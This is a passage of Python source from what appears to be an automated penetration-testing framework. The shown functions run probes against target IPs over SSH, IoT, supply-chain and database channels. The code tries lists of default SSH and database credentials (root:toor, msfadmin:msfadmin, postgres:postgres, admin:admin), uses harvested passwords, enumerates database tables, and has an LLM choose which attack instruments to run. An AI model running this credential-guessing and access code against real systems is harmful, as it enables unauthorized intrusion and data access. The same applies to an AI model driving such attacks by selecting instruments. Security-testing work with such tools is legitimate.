                    u, _, p = line.partition(":")
                    if u.strip() and p.strip():
                        harvested.append({"username": u.strip(), "password": p.strip()})
    except Exception:
        pass

    # Run the discovery adapter in-process
    try:
        db_mod = _load_module_from_file("skg_db_discovery", db_discovery_path)
        events = db_mod.run(
            host=ip,
            ssh_port=ssh_port,
            user=ssh_user,
            password=ssh_password,
            key=ssh_key,
            workload_id=workload_id,
            run_id=run_id,
            harvested_creds=harvested if harvested else None,
        )
    except Exception as exc:
        result["error"] = f"db_discovery: {exc}"
        return result

    if not events:
        result["error"] = "db_discovery: no events returned (SSH failed or no DB found)"
        return result

    out_dir_path = Path(out_dir) if out_dir else SKG_STATE_DIR / "gravity"
    out_dir_path.mkdir(parents=True, exist_ok=True)
    events_file = out_dir_path / f"db_discovery_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with events_file.open("w") as fh:
        for ev in events:
            fh.write(json.dumps(ev) + "\n")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(events_file)
    _project_gravity_events(str(events_file), run_id, result)
    print(f"    [DB_DISCOVERY] {ip}: {len(events)} wicket events → {events_file.name}")
    return result


def _exec_iot_firmware(ip, target, run_id, out_dir, result):
    """Run the IoT firmware probe against ip (live) or a local firmware image."""
    probe_path = SKG_HOME / "skg-iot_firmware-toolchain" / "adapters" / "firmware_probe" / "probe.py"
    try:
        firmware_probe = _load_module_from_file("skg_iot_firmware_probe", probe_path)
        probe_device = firmware_probe.probe_device
        probe_from_image = firmware_probe.probe_from_image
        probe_network_only = getattr(firmware_probe, "probe_network_only", None)
    except Exception:
        result["error"] = "firmware_probe adapter not found at /opt/skg"
        return result

    targets_file = _config_file("targets.yaml")
    ssh_target   = None
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    workload_id = f"iot::{ip}"
    apid        = "iot_firmware_network_exploit_v1"

    if ssh_target:
        events = probe_device(
            host=ip, user=ssh_target.get("user", "root"),
            password=ssh_target.get("password", ""),
            port_ssh=int(ssh_target.get("port", 22)),
            workload_id=workload_id, run_id=run_id,
            attack_path_id=apid,
        )
    else:
        # No SSH creds — try local firmware image
        image_candidates = (
            list(SKG_STATE_DIR.glob(f"firmware_{ip.replace('.','_')}*.bin")) +
            list(SKG_STATE_DIR.glob("firmware_*.bin"))
        )
        if image_candidates:
            events = probe_from_image(
                str(image_candidates[0]), workload_id=workload_id,
                run_id=run_id, attack_path_id=apid,
            )
        else:
            # No SSH creds and no firmware image — fall back to network-only probe.
            # The instrument observes what it can reach: banner grabs and HTTP probes
            # on known IoT ports give us version strings and exposed interfaces.
            try:
                if probe_network_only is None:
                    raise RuntimeError("probe_network_only not available")
                events = probe_network_only(
                    host=ip,
                    ports=[svc.get("port") for svc in target.get("services", [])
                           if svc.get("port")],
                    workload_id=workload_id, run_id=run_id,
                    attack_path_id=apid,
                )
            except Exception as _ne:
                result["success"]    = False
                result["action"]     = "operator"
                result["suggestion"] = (
                    f"Add {ip} to {_config_file('targets.yaml')} for SSH access. "
                    f"Network probe failed: {_ne}"
                )
                return result

    if not events:
        result["success"] = True
        result["events"]  = 0
        return result

    ev_file = out_dir / f"gravity_iot_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in events if e["payload"]["status"] == "realized")
    b = sum(1 for e in events if e["payload"]["status"] == "blocked")
    u = sum(1 for e in events if e["payload"]["status"] == "unknown")
    print(f"    [IOT] {ip}: {len(events)} events ({r}R {b}B {u}U)")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(ev_file)
    _project_gravity_events(ev_file, run_id, result)
    return result


def _exec_supply_chain(ip, target, run_id, out_dir, result):
    """Run the supply chain SBOM check against a target."""
    import sys as _sys
    _sys.path.insert(0, "/opt/skg/skg-supply-chain-toolchain/adapters/sbom_check")
    try:
        from check import evaluate_packages, collect_via_ssh
    except ImportError:
        result["error"] = "sbom_check adapter not found"
        return result

    targets_file = _config_file("targets.yaml")
    ssh_target   = None
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    workload_id = f"supply_chain::{ip}"
    apid        = "supply_chain_rce_via_dependency_v1"

    if not ssh_target:
        result["success"]    = False
        result["action"]     = "operator"
        result["suggestion"] = (
            f"Add {ip} to {_config_file('targets.yaml')} to enable supply chain analysis, "
            f"or use: skg supply --host {ip}"
        )
        return result

    try:
        packages = collect_via_ssh(
            host=ip, user=ssh_target.get("user","root"),
            key=ssh_target.get("key"), password=ssh_target.get("password"),
            port=int(ssh_target.get("port",22)),
        )
        events = evaluate_packages(packages, workload_id=workload_id,
                                   run_id=run_id, attack_path_id=apid)
    except Exception as exc:
        result["error"] = f"supply_chain collection failed: {exc}"
        return result

    if not events:
        result["success"] = True
        result["events"]  = 0
        return result

    ev_file = out_dir / f"gravity_sc_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in events if e["payload"]["status"] == "realized")
    b = sum(1 for e in events if e["payload"]["status"] == "blocked")
    u = sum(1 for e in events if e["payload"]["status"] == "unknown")
    print(f"    [SC] {ip}: {len(events)} events ({r}R {b}B {u}U)")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(ev_file)
    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / ev_file.name).write_text(ev_file.read_text())
    except Exception:
        pass
    _project_gravity_events(ev_file, run_id, result)
    return result


def _exec_sysaudit(ip, target, run_id, out_dir, result):
    """
    Run the sysaudit adapter against the target via SSH.

    Loads credentials from targets.yaml, opens a paramiko session, calls
    run_sysaudit() which executes all FI/PI/LI checks on the remote host,
    writes events to DISCOVERY_DIR with target_ip stamped.

    Gravity selects this instrument when FI-*, PI-*, or LI-* wickets are
    unknown — the same wavelength-matching logic that selects http_collector
    for WB-* unknowns. The entropy reduction signal is real: after a first
    run all wickets collapse to realized/blocked/unknown based on live state.
    Subsequent runs detect changes (new SUID, crontab modification, log shrink).

    Falls back to an operator suggestion if no credentials are configured.
    """
    import sys as _sys

    try:
        import paramiko
    except ImportError:
        result["error"] = "paramiko not installed"
        return result

    client, used, last_exc = _connect_ssh_with_fallback(
        ip, f"audit::{ip}", "full_system_integrity_v1"
    )
    if client is None or used is None:
        result["error"] = f"SSH connect failed: {last_exc}"
        return result

    workload_id = used["workload_id"]
    attack_path_id = used["attack_path_id"]
    print(f"    [AUDIT] Connected as {used['user']} ({used['label']})")

    print(f"    [AUDIT] Running FI/PI/LI checks on {ip}...")

    try:
        _sys.path.insert(0, "/opt/skg/skg-host-toolchain/adapters/sysaudit")
        from audit import run_sysaudit

        events = run_sysaudit(
            client, ip, workload_id, attack_path_id, run_id,
        )
    except Exception as exc:
        result["error"] = f"sysaudit failed: {exc}"
        client.close()
        return result

    client.close()

    if not events:
        result["success"] = True
        result["events"]  = 0
        return result

    # Write events with target_ip stamped for load_wicket_states
    ev_file = out_dir / f"gravity_audit_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in events if e["payload"]["status"] == "realized")
    b = sum(1 for e in events if e["payload"]["status"] == "blocked")
    u = sum(1 for e in events if e["payload"]["status"] == "unknown")
    print(f"    [AUDIT] {ip}: {len(events)} events ({r}R {b}B {u}U) → {ev_file.name}")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(ev_file)
    _project_gravity_events(ev_file, run_id, result)
    return result


def _exec_data_profiler(ip, target, run_id, out_dir, result):
    """
    Run the database profiler against configured data sources for this target.

    The data profiler is directed by gravity exactly like any other instrument:
    gravity selects it when DP-* wickets are unknown, runs it, and measures
    the entropy change. The same physics — wavelength, cost, penalty, shifting
    — apply without modification.

    'target' for a data source has the same shape as a network target but
    the 'ip' field is a workload_id like 'banking::orders' and the 'services'
    list contains data source descriptors instead of port/service pairs.

    Data sources are read from:
      1. target['data_sources'] if present (gravity-generated target)
      2. /etc/skg/data_sources.yaml (operator-declared)
      3. skg_config.yaml sensors.data.sources
    """
    import sys as _sys
    import os as _os

    _sys.path.insert(0, str(SKG_HOME / "skg-data-toolchain"))

    # Find data sources for this target.
    # SKG derives data sources from what it observes — the surface services list
    # is the primary source of truth. If the target has mysql:3306 or postgres:5432
    # in its services, those ARE the data sources. No pre-configuration needed.
    data_sources = list(target.get("data_sources", []))

    # Derive from surface services (the instrument observes what's there)
    DB_PORT_MAP = {
        3306: ("mysql", "mysql://root@{ip}:{port}/"),
        5432: ("postgresql", "postgresql://postgres@{ip}:{port}/"),
        5433: ("postgresql", "postgresql://postgres@{ip}:{port}/"),
        1433: ("mssql", "mssql+pymssql://sa@{ip}:{port}/"),
        1521: ("oracle", "oracle+cx_oracle://system@{ip}:{port}/xe"),
        6379: ("redis", "redis://{ip}:{port}/"),
        27017:("mongodb", "mongodb://{ip}:{port}/"),
    }
    for svc in target.get("services", []):
        port = svc.get("port")
        svc_name = (svc.get("name") or svc.get("service") or "").lower()
        db_name = svc.get("version") or svc.get("product") or svc_name
        if port in DB_PORT_MAP:
            kind, url_tmpl = DB_PORT_MAP[port]
            url = url_tmpl.format(ip=ip, port=port)
            workload_id = f"{kind}::{ip}:{port}"
            # Avoid duplicates
            if not any(ds.get("url","").startswith(url.split("/")[0]) for ds in data_sources):
                data_sources.append({
                    "url": url,
                    "workload_id": workload_id,
                    "table": "",   # profiler will enumerate tables
                    "attack_path_id": "data_completeness_failure_v1",
                    "kind": kind,
                })
                print(f"    [data_profiler] Derived source from surface: {kind} @ {ip}:{port}")

    # Also check operator config file for additional sources
    config_file = _config_file("data_sources.yaml")
    if config_file.exists():
        try:
            import yaml
            cfg = yaml.safe_load(config_file.read_text())
            all_sources = cfg.get("data_sources", [])
            for src_cfg in all_sources:
                url = src_cfg.get("url", "")
                wid = src_cfg.get("workload_id", "")
                if ip in url or ip in wid or not ip.replace(".","").isdigit():
                    if not any(d.get("url") == url for d in data_sources):
                        data_sources.append(src_cfg)
        except Exception:
            pass

    if not data_sources:
        result["error"] = (
            "No database services found on this target. "
            f"Target {ip} has no recognized DB ports in surface services."
        )
        return result

    try:
        from adapters.db_profiler.profile import profile_table, DBConnection
    except ImportError:
        result["error"] = (
            f"db_profiler not found under {SKG_HOME / 'skg-data-toolchain'}. "
            "Run setup_arch.sh to install."
        )
        return result

    def _candidate_urls(src: dict) -> list[str]:
        from urllib.parse import urlsplit, urlunsplit

        url = (src.get("url") or "").strip()
        if not url:
            return []

        candidates = [url]
        kind = (src.get("kind") or "").lower()
        split = urlsplit(url)
        host = split.hostname or ip
        port = f":{split.port}" if split.port else ""
        path = split.path or "/"
        query_prefix = "&" if split.query else "?"
        query = split.query

        if kind == "mysql":
            for user, password in [
                ("root", ""),
                ("root", "root"),
                ("root", "toor"),
                ("msfadmin", "msfadmin"),
                ("admin", "admin"),
            ]:
                auth = user if password == "" else f"{user}:{password}"
                mysql_query = query
                if "charset=" not in mysql_query:
                    mysql_query = f"{mysql_query}{'&' if mysql_query else ''}charset=utf8"
                candidates.append(
                    urlunsplit(("mysql+pymysql", f"{auth}@{host}{port}", path, mysql_query, ""))
                )

        elif kind in {"postgres", "postgresql"}:
            pg_path = path if path and path != "/" else "/postgres"
            for user, password in [
                ("postgres", "postgres"),
                ("postgres", ""),
                ("msfadmin", "msfadmin"),
                ("admin", "admin"),
            ]:
                auth = user if password == "" else f"{user}:{password}"
                q = query
                if "sslmode=" not in q:
                    q = f"{q}{query_prefix if q else ''}sslmode=disable"
                candidates.append(
                    urlunsplit(("postgresql", f"{auth}@{host}{port}", pg_path, q, ""))
                )

        # Preserve order while dropping duplicates.
        deduped = []
        seen = set()
        for candidate in candidates:
            if candidate not in seen:
                deduped.append(candidate)
                seen.add(candidate)
        return deduped

    total_events = 0
    events_files = []
    successful_sources = []

    def _connectivity_event(kind: str, workload_id: str, detail: str) -> dict:
        now = iso_now()
        return _gravity_precondition_event(
            source_id="adapter.db_profiler",
            toolchain="skg-data-toolchain",
            wicket_id="DP-10",
            status="realized",
            workload_id=workload_id,
            target_ip=ip,
            detail=detail,
            evidence_rank=4,
            source_kind="db_profiler_runtime",
            pointer=workload_id,
            confidence=0.95,
            run_id=run_id,
            domain="data",
            version="0.1.0",
            ts=now,
            extra_payload={"observed_at": now},
        )

    for src in data_sources:
        url         = src.get("url", "")
        table       = src.get("table", "")
        workload_id = src.get("workload_id") or f"data::{table}"
        contract    = src.get("contract")
        apid        = src.get("attack_path_id", "data_completeness_failure_v1")

        if not url:
            continue

        candidate_urls = _candidate_urls(src)
        working_url = None
        tables = [table] if table else []
        connected_without_tables = False
        if not tables:
            last_exc = None
            for candidate_url in candidate_urls:
                try:
                    db = DBConnection(candidate_url)
                    db.connect()
                    kind = (src.get("kind") or "").lower()
                    connected_without_tables = True
                    if kind == "mysql":
                        rows = db.query(
                            "SELECT table_schema, table_name "
                            "FROM information_schema.tables "
                            "WHERE table_schema NOT IN "
                            "('information_schema','mysql','performance_schema','sys') "
                            "ORDER BY table_schema, table_name LIMIT 3"
                        )
                        tables = [
                            f"{r.get('table_schema')}.{r.get('table_name')}"
                            for r in rows
                            if r.get("table_schema") and r.get("table_name")
                        ]
                    elif kind in {"postgresql", "postgres"}:
                        rows = db.query(
                            "SELECT tablename FROM pg_catalog.pg_tables "
                            "WHERE schemaname = 'public' "
                            "ORDER BY tablename LIMIT 3"
                        )
                        tables = [r.get("tablename") for r in rows if r.get("tablename")]
                    db.close()
                    successful_sources.append(workload_id)
                    if tables:
                        working_url = candidate_url
                        print(f"    [DATA] Enumerated tables for {workload_id}: {', '.join(tables)}")
                        break
                    print(f"    [DATA] Connected to {workload_id} but found no application tables")
                    break
                except Exception as exc:
                    last_exc = exc
                    continue
            if not tables:
                if connected_without_tables:
                    ev = _connectivity_event(
                        src.get("kind", "data"),
                        workload_id,
                        "Connected to data source but found no application tables to profile",
                    )
                    ev_file = out_dir / f"gravity_data_{workload_id.replace('::', '_')}_{run_id}.ndjson"
                    with open(ev_file, "w") as fh:
                        fh.write(json.dumps(ev) + "\n")
                    total_events += 1
                    events_files.append(str(ev_file))
                    _project_gravity_events(ev_file, run_id, result)
                    print(f"    [DATA] {workload_id}: connectivity observed (no tables)")
                    continue
                if last_exc is not None:
                    print(f"    [DATA] Enumeration failed for {workload_id}: {last_exc}")
                continue

        if not tables:
            continue

        if working_url:
            url = working_url

        for table in tables:
            profile_url = url
            profile_table_name = table
            profile_workload_id = workload_id if src.get("table") else f"{workload_id}::{table}"

            if "." in table and (src.get("kind") or "").lower() == "mysql":
                from urllib.parse import urlsplit, urlunsplit

                schema_name, bare_table = table.split(".", 1)
                split = urlsplit(url)
                profile_url = urlunsplit((
                    split.scheme,
                    split.netloc,
                    f"/{schema_name}",
                    split.query,
                    split.fragment,
                ))
                profile_table_name = bare_table

            print(f"    [DATA] Profiling {table} ({profile_workload_id})")

            try:
                events = profile_table(
                    url=profile_url, table=profile_table_name,
                    workload_id=profile_workload_id,
                    contract_path=contract,
                    attack_path_id=apid,
                    run_id=run_id,
                )
            except Exception as exc:
                print(f"    [DATA] Profile failed: {exc}")
                continue

            if not events:
                continue

            # Write to gravity output dir with target_ip stamped
            ev_file = out_dir / f"gravity_data_{profile_workload_id.replace('::', '_')}_{run_id}.ndjson"
            with open(ev_file, "w") as fh:
                for ev in events:
                    ev.setdefault("payload", {})["target_ip"] = ip
                    fh.write(json.dumps(ev) + "\n")

            total_events += len(events)
            events_files.append(str(ev_file))
            _project_gravity_events(ev_file, run_id, result)

            r = sum(1 for e in events if e["payload"]["status"] == "realized")
            b = sum(1 for e in events if e["payload"]["status"] == "blocked")
            u = sum(1 for e in events if e["payload"]["status"] == "unknown")
            print(f"    [DATA] {profile_workload_id}: {len(events)} events ({r}R {b}B {u}U)")

    result["success"]      = total_events > 0 or bool(successful_sources)
    result["events"]       = total_events
    result["events_files"] = events_files
    if not result["success"]:
        result["error"] = "No events produced — check data source config"
    return result


def _exec_ssh_sensor(ip, target, run_id, out_dir, result):
    """
    Run the SSH sensor against the target.

    Loads target credentials from targets.yaml, opens a paramiko session,
    and runs the host toolchain adapter directly.  Writes events to out_dir
    so load_wicket_states() picks them up on the next entropy calculation.

    Falls back to an operator suggestion if no credentials are configured.
    """
    import sys as _sys

    try:
        import paramiko
    except ImportError:
        result["error"] = "paramiko not installed"
        return result

    # Match audit-scan behavior: inventory creds first, then lab defaults,
    # then agent/no-password.
    cred_candidates = []
    targets_file = _config_file("targets.yaml")
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text()) or {}
            for t in data.get("targets", []):
                if t.get("host") == ip or t.get("workload_id", "").endswith(ip):
                    auth = t.get("auth", {})
                    cred_candidates.append({
                        "user": auth.get("user") or t.get("user") or "root",
                        "password": auth.get("password") or t.get("password"),
                        "key": auth.get("key") or t.get("key"),
                        "port": int(auth.get("port") or t.get("port") or 22),
                        "workload_id": t.get("workload_id", f"ssh::{ip}"),
                        "attack_path_id": t.get("attack_path_id", "host_ssh_initial_access_v1"),
                        "label": "targets.yaml",
                    })
                    break
        except Exception:
            pass

    for user, password in [
        ("msfadmin", "msfadmin"),
        ("user", "user"),
        ("root", "toor"),
        ("root", "root"),
        ("admin", "admin"),
    ]:
        cred_candidates.append({
            "user": user,
            "password": password,
            "key": None,
            "port": 22,
            "workload_id": f"ssh::{ip}",
            "attack_path_id": "host_ssh_initial_access_v1",
            "label": "lab-default",
        })

    cred_candidates.append({
        "user": "root",
        "password": None,
        "key": None,
        "port": 22,
        "workload_id": f"ssh::{ip}",
        "attack_path_id": "host_ssh_initial_access_v1",
        "label": "agent",
    })

    # Probe SSH port connectivity before attempting credential-based access.
    # Avoids paramiko hanging on filtered ports and emits a clean blocked event.
    _ssh_probe_port = 22
    try:
        import socket as _sock
        with _sock.create_connection((ip, _ssh_probe_port), timeout=5):
            pass
    except (OSError, ConnectionRefusedError):
        result["error"] = f"SSH port {_ssh_probe_port} not reachable on {ip}"
        return result
    except Exception:
        pass  # Unexpected probe error; proceed and let paramiko surface it

    client = None
    last_exc = None
    used = None
    for candidate in cred_candidates:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if candidate["key"]:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    key_filename=_P(candidate["key"]).expanduser().__str__(),
                    timeout=10,
                )
            elif candidate["password"] is not None:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    password=os.path.expandvars(candidate["password"]),
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False,
                )
            else:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    timeout=10,
                )
            used = candidate
            break

        except Exception as exc:
            last_exc = exc
            try:
                client.close()
            except Exception:
                pass
            client = None

    if client is None or used is None:
        result["error"] = f"SSH connect failed: {last_exc}"
        return result

    user = used["user"]
    key = used["key"]
    port = used["port"]
    workload_id = used["workload_id"]
    attack_path_id = used["attack_path_id"]
    print(f"    [SSH] Connected as {user} ({used['label']})")

    events_file = out_dir / f"gravity_ssh_{ip}_{run_id[:8]}.ndjson"

    try:
        if str(REPO_ROOT) not in _sys.path:
            _sys.path.insert(0, str(REPO_ROOT))
        from skg_services.gravity.host_runtime import collect_ssh_session_assessment_to_file

        events = collect_ssh_session_assessment_to_file(
            client,
            host=ip,
            out_path=events_file,
            attack_path_id=attack_path_id,
            run_id=run_id,
            workload_id=workload_id,
            username=user,
            auth_type="key" if key else "password",
            port=port,
        )

        result["success"] = True
        result["events_file"] = str(events_file)
        _project_gravity_events(events_file, run_id, result)
        print(f"    [SSH] {ip}: {len(events)} events → {events_file.name}")

        # Defer follow-on proposal generation to the main gravity thread so
        # interactive review is not attempted from a worker thread.
        result["follow_on_paths"] = [{
            "path_id": "host_ssh_initial_access_v1",
            "port": port,
            "kwargs": {
                "ssh_user": user,
                "ssh_pass": os.path.expandvars(used.get("password") or ""),
            },
        }]
    except Exception as exc:
        result["error"] = f"SSH collection failed: {exc}"
    finally:
        client.close()

    return result


def _connect_ssh_with_fallback(ip: str, workload_id: str, attack_path_id: str):
    import paramiko

    cred_candidates = []
    targets_file = _config_file("targets.yaml")
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text()) or {}
            for t in data.get("targets", []):
                if t.get("host") == ip or t.get("workload_id", "").endswith(ip):
                    auth = t.get("auth", {})
                    cred_candidates.append({
                        "user": auth.get("user") or t.get("user") or "root",
                        "password": auth.get("password") or t.get("password"),
                        "key": auth.get("key") or t.get("key"),
                        "port": int(auth.get("port") or t.get("port") or 22),
                        "workload_id": t.get("workload_id", workload_id),
                        "attack_path_id": t.get("attack_path_id", attack_path_id),
                        "label": "targets.yaml",
                    })
                    break
        except Exception:
            pass

    for user, password in [
        ("msfadmin", "msfadmin"),
        ("user", "user"),
        ("root", "toor"),
        ("root", "root"),
        ("admin", "admin"),
    ]:
        cred_candidates.append({
            "user": user,
            "password": password,
            "key": None,
            "port": 22,
            "workload_id": workload_id,
            "attack_path_id": attack_path_id,
            "label": "lab-default",
        })

    cred_candidates.append({
        "user": "root",
        "password": None,
        "key": None,
        "port": 22,
        "workload_id": workload_id,
        "attack_path_id": attack_path_id,
        "label": "agent",
    })

    client = None
    last_exc = None
    used = None
    for candidate in cred_candidates:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if candidate["key"]:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    key_filename=_P(candidate["key"]).expanduser().__str__(),
                    timeout=10,
                )
            elif candidate["password"] is not None:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    password=os.path.expandvars(candidate["password"]),
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False,
                )
            else:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    timeout=10,
                )
            used = candidate
            break
        except Exception as exc:
            last_exc = exc
            try:
                client.close()
            except Exception:
                pass
            client = None

    return client, used, last_exc


def _state_status(value) -> str:
    if isinstance(value, dict):
        return value.get("status", "unknown")
    if isinstance(value, str):
        return value
    return "unknown"


def _collect_observation_refs(results: dict) -> list[str]:
    refs: list[str] = []
    for res in results.values():
        if not isinstance(res, dict):
            continue
        for key in ("events_file", "interp_file", "post_events_file", "log_file"):
            value = res.get(key)
            if value:
                refs.append(str(value))
        for key in ("events_files",):
            values = res.get(key) or []
            for value in values:
                if value:
                    refs.append(str(value))
    seen = set()
    ordered = []
    for ref in refs:
        if ref in seen:
            continue
        seen.add(ref)
        ordered.append(ref)
    return ordered


def _collect_observation_confirms(results: dict, target_ip: str) -> list[dict]:
    confirms = []
    seen = set()
    target_identity = str(parse_workload_ref(target_ip).get("identity_key") or target_ip).strip()
    target_aliases = {
        str(target_ip or "").strip(),
        target_identity,
    }
    target_aliases.discard("")
    for res in results.values():
        if not isinstance(res, dict):
            continue
        paths = []
        for key in ("events_file", "post_events_file"):
            value = res.get(key)
            if value:
                paths.append(Path(value))
        for value in res.get("events_files", []) or []:
            if value:
                paths.append(Path(value))

        for path in paths:
            try:
                if not path.exists():
                    continue
                for line in path.read_text(errors="replace").splitlines():
                    if not line.strip():
                        continue
                    try:
                        ev = json.loads(line)
                    except Exception:
                        continue
                    if ev.get("type") != "obs.attack.precondition":
                        continue
                    payload = ev.get("payload", {})
                    wicket_id = payload.get("wicket_id")
                    status = payload.get("status")
                    workload_id = payload.get("workload_id", "")
                    ev_identity = str(parse_workload_ref(workload_id).get("identity_key") or "").strip()
                    ev_target = str(payload.get("target_ip") or ev_identity or "").strip()
                    if not wicket_id or status not in {"realized", "blocked"}:
                        continue
                    ev_aliases = {ev_target, ev_identity, workload_id}
                    ev_aliases.discard("")
                    if ev_aliases and not (ev_aliases & target_aliases):
                        continue
                    evidence = ev.get("provenance", {}).get("evidence", {})
                    key = (workload_id, wicket_id, status, evidence.get("pointer", ""))
                    if key in seen:
                        continue
                    seen.add(key)
                    confirms.append({
                        "target_ip": target_ip,
                        "identity_key": target_identity or target_ip,
                        "workload_id": workload_id or f"gravity::{target_identity or target_ip}",
                        "wicket_id": wicket_id,
                        "status": status,
                        "attack_path_id": payload.get("attack_path_id", ""),
                        "source_kind": evidence.get("source_kind", ""),
                        "pointer": evidence.get("pointer", ""),
                        "detail": payload.get("detail", "") or payload.get("notes", ""),
                    })
            except Exception:
                continue
    return confirms


def _record_cycle_pearl(
    ip: str,
    run_id: str,
    cycle_num: int,
    before_states: dict,
    after_states: dict,
    before_target: dict,
    after_target: dict,
    before_domains: set,
    after_domains: set,
    before_entropy: float,
    after_entropy: float,
    before_fold_boost: float,
    after_fold_boost: float,
    concurrent_results: dict,
    fold_manager=None,
) -> None:
    state_changes = []
    all_wickets = set(before_states.keys()) | set(after_states.keys())
    for wicket_id in sorted(all_wickets):
        old_status = _state_status(before_states.get(wicket_id, {}))
        new_status = _state_status(after_states.get(wicket_id, {}))
        if old_status == new_status:
            continue
        state_changes.append({
            "target_ip": ip,
            "workload_id": f"gravity::{ip}",
            "wicket_id": wicket_id,
            "from": old_status,
            "to": new_status,
        })

    projection_changes = []
    added_domains = sorted(after_domains - before_domains)
    removed_domains = sorted(before_domains - after_domains)
    if added_domains or removed_domains:
        projection_changes.append({
            "target_ip": ip,
            "kind": "domain_shift",
            "added": added_domains,
            "removed": removed_domains,
        })

    before_services = {
        (svc.get("port"), svc.get("service"))
        for svc in before_target.get("services", [])
    }
    after_services = {
        (svc.get("port"), svc.get("service"))
        for svc in after_target.get("services", [])
    }
    new_services = sorted(after_services - before_services)
    if new_services:
        projection_changes.append({
            "target_ip": ip,
            "kind": "service_shift",
            "added": [f"{port}/{service}" for port, service in new_services],
        })

    reason_changes = []
    for name, res in concurrent_results.items():
        if not isinstance(res, dict):
            continue
        if res.get("success") or res.get("action"):
            reason_changes.append({
                "instrument": name,
                "success": bool(res.get("success")),
                "action": res.get("action", ""),
                "proposal_id": res.get("proposal_id", ""),
                "unknowns_resolved": res.get("unknowns_resolved", 0),
            })

    observation_refs = _collect_observation_refs(concurrent_results)
    observation_confirms = _collect_observation_confirms(concurrent_results, ip)
    if not (state_changes or observation_confirms or projection_changes or reason_changes or observation_refs):
        return

    decay_class = "structural"
    if any(change.get("to") == "realized" for change in state_changes):
        decay_class = "operational"

    target_snapshot = {
        "ip": after_target.get("ip", ip),
        "kind": after_target.get("kind") or after_target.get("os") or "unknown",
        "domains": sorted(after_domains),
        "services": [
            {
                "port": svc.get("port"),
                "service": svc.get("service"),
                "banner": svc.get("banner", ""),
            }
            for svc in after_target.get("services", [])
        ],
        "identity_properties": _infer_target_identity_properties(after_target),
    }

    fold_context = []
    if fold_manager:
        for fold in sorted(fold_manager.all(), key=lambda f: -f.gravity_weight())[:8]:
            fold_context.append({
                "id": fold.id,
                "fold_type": fold.fold_type,
                "gravity_weight": round(fold.gravity_weight(), 4),
                "detail": fold.detail,
                "why": getattr(fold, "why", {}) or {},
                "hypotheses": list(getattr(fold, "hypotheses", []) or [])[:3],
                "discriminators": list(getattr(fold, "discriminators", []) or [])[:3],
            })

    pearl = Pearl(
        state_changes=state_changes,
        observation_confirms=observation_confirms,
        projection_changes=projection_changes,
        reason_changes=reason_changes,
        observation_refs=observation_refs,
        energy_snapshot={
            "target_ip": ip,
            "workload_id": f"gravity::{ip}",
            "run_id": run_id,
            "cycle": cycle_num,
            "entropy_before": round(before_entropy, 4),
            "entropy_after": round(after_entropy, 4),
            "fold_boost_before": round(before_fold_boost, 4),
            "fold_boost_after": round(after_fold_boost, 4),
            "decay_class": decay_class,
        },
        target_snapshot=target_snapshot,
        fold_context=fold_context,
    )
    _pearls.record(pearl)


# ── LLM-directed instrument selection ────────────────────────────────────

def _llm_select_instruments(
    t: dict,
    candidates: list,          # [(potential, name, inst), ...]
    instruments: dict,
    authorized: bool = False,
    max_instruments: int = 6,
) -> list | None:
    """
    Ask Ollama (or Claude if configured) to select which instruments to run
    against this target, given the full gravity field context.

    Gravity computes the physics — entropy, wicket states, folds, potentials.
    The LLM reads that context and makes the instrument selection call.

    Returns a (potentially reordered, filtered) subset of `candidates`, or
    None if the LLM is unavailable / returns bad JSON (caller falls back to
    gravity scoring).
    """
    # Prefer a backend capable of reliable structured output.
    # Claude (Anthropic) > larger Ollama models > skip for tiny models.
    try:
        import sys as _sys
        _sys.path.insert(0, str(SKG_HOME))
        from skg.resonance.llm_pool import get_pool, AnthropicLLMBackend, OllamaLLMBackend
        pool = get_pool()
        if not pool.any_available():
            return None

        # Identify the best backend for structured output
        _structured_backend = None
        for _b in pool.available_backends():
            if isinstance(_b, AnthropicLLMBackend):
                _structured_backend = _b
                break
        if _structured_backend is None:
            # Ollama: accept any model but flag capability level
            for _b in pool.available_backends():
                if isinstance(_b, OllamaLLMBackend):
                    _structured_backend = _b
                    break
    except Exception:
        return None

    ip = t["ip"]
    services = t.get("services") or t.get("target", {}).get("services") or []
    states = t.get("states", {})
    target_dict = t.get("target", t)

    # ── Build context sections ────────────────────────────────────────────

    # Services
    svc_lines = []
    for s in services:
        banner = s.get("banner", "")
        svc_lines.append(
